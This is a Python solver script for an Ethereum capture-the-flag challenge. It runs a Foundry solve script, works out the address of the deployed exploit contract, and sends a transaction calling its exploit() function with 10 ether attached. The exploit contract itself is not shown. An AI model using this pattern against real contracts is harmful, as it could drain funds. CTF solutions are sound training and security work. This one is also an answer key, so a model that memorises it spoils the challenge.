import rlp
from eth_account import Account
from eth_account.account import LocalAccount
from ctf_solvers.pwn_solver import PwnChallengeSolver
from ctf_solvers.utils import solve
from web3 import Web3
from web3.middleware.signing import construct_sign_and_send_raw_middleware


def compute_contract_address(acct: LocalAccount, nonce: int) -> str:
    addr = bytes.fromhex(acct.address[2:])
    return Web3.to_checksum_address(
        Web3.keccak(primitive=rlp.encode([addr, nonce]))[-20:].hex()
    )


class Solver(PwnChallengeSolver):
    def _solve(self, rpcs, player, challenge):
        acct: LocalAccount = Account.from_key(player)

        web3 = Web3(Web3.HTTPProvider(rpcs[0]))
        web3.middleware_onion.add(construct_sign_and_send_raw_middleware(acct))

        solve(web3, "project", player, challenge, "script/Solve.s.sol:Solve")

        contract_addr = compute_contract_address(acct, 0)
        txhash = web3.eth.send_transaction(
            {
                "from": acct.address,
                "to": contract_addr,
                "data": web3.keccak(text="exploit()")[:4].hex(),
                "gas": 25_000_000,
                "gasPrice": int(40e9),
                "value": int(10e18),
            }
        )
        rcpt = web3.eth.wait_for_transaction_receipt(txhash)
        if rcpt["status"] != 1:
            raise Exception("tx failed", txhash.hex())


Solver().start()
